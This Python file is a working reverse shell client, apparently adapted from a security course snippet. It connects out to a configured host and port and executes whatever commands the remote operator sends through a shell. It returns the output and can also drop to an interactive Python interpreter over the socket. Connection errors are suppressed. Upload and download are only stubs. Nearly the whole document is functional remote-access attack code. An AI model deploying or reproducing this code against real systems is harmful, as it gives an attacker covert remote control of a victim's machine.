import socket
import sys
import time
import code
import subprocess


HOST = '127.0.0.1'
PORT = 8000


class ShellSocket(socket.socket):
    """ Modifying sockets to behave like file objects to redirect
    stdin and stdout. Class modified from code snippet in SEC573 to
    work in Python3
    """
    def __init__(self, *args):
        socket.socket.__init__(self, *args)
    def write(self, text):
        return self.send(text.encode())
    def readline(self):
        return self.recv(1024).decode()    
    def flush(self):
        return True   

        
def get_help(socket):
    """ Prints list of available commands
    """
    menu = '''
    Commands     Description
    help         Display this message
    upload       Upload a file (Not yet implemented)
    download     Download a file (Not yet implemented) 
    exec         Execute a command
    !            Execute a command
    ?            Display this message
    pyshell      Drop to an interactive python interpreter
    quit         Close the connection
'''
    socket.send(menu.encode())
        
        
def run_pyshell(socket):
    """ Drops to an interactive Python interpreter.
    """
    def execute(cmd, timeout=1):
        """ Defines a local function that allows the Python interpreter to
        execute a command.
        """
        cmd_handler = subprocess.Popen(cmd,shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        if timeout:
            time.sleep(timeout)
        else:
            cmd_handler.wait()
        return cmd_handler.stdout.read() + cmd_handler.stderr.read()     

    def console_exit():
        """ Defines a local function that allows the Python interpreter
        to exit without exiting the program completely.
        """
        raise SystemExit
    
    socket.send(b'Entering interactive mode. Type "exit()" to exit the shell\nTo execute a command, type execute(\'<command>\')\n\n')
    sys.stdout=sys.stdin=sys.stderr=socket
    try:
        code.interact("Welcome to the pyshell interpreter!", local={"exit": console_exit, 'execute': execute})
    except SystemExit:
        pass
    

def socket_connect(socket):
    """ Connects to a defined host/port.
    """
    try:
        #print('Trying to connect to {}:{}'.format(HOST, str(PORT)))
        socket.connect((HOST, PORT))
    except:
        #print("Unable to connect to {}:{}".format(HOST, str(PORT)))
        exit()

        
def upload(socket, file):
    """ Uploads a file to the target system.
    """
    socket.send((' [+]  Uploading file: {}\n'.format(file)).encode())
    

def download(socket, file):
    """ Downloads a file from the target system.
    """
    socket.send((' [+]  Downloading file {}\n'.format(file)).encode())


def exec_cmd(socket, command):
    """ Executes a command on the target system. Does not maintain state.
    """
    if command.startswith('cmd'):
        socket.send(' [-]  Do not type cmd or cmd.exe before the command!\n'.encode())
        return
    socket.send((' [+]  Executing command: {}\n'.format(command)).encode())
    cmd_handler = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    cmd_handler.wait()
    cmd_results = cmd_handler.stdout.read() + cmd_handler.stderr.read()
    socket.send(cmd_results)
    
    
def main():
    s = ShellSocket()
    socket_connect(s)
    while True:
        s.send(b'> ')
        command_requested = s.recv(1024)
        command_requested = str(command_requested.strip(), 'utf-8')
        #print(command_requested)
        if len(command_requested) == 0:
            continue
        if command_requested.lower() == 'help':
            get_help(s)
            continue
        if command_requested.lower() == '?':
            get_help(s)
            continue
        if command_requested.lower() == 'quit':
            s.send(b'Terminating Connection...')
            break
        if command_requested.split(' ')[0].lower() == 'upload':
            upload(s, command_requested.split(' ')[1])
            continue
        if command_requested.split(' ')[0].lower() == 'download':
            download(s, command_requested.split(' ')[1])
            continue
        if command_requested.split(' ')[0].lower() == 'exec':
            command = command_requested.split(' ')[1:]
            command = ' '.join(command)
            exec_cmd(s, command)
            continue
        if command_requested.split(' ')[0] == '!':
            command = command_requested.split(' ')[1:]
            command = ' '.join(command)
            exec_cmd(s, command)
            continue
        if command_requested.lower() == 'pyshell':
            run_pyshell(s)
            continue
 
 
if __name__ == '__main__':
    main()
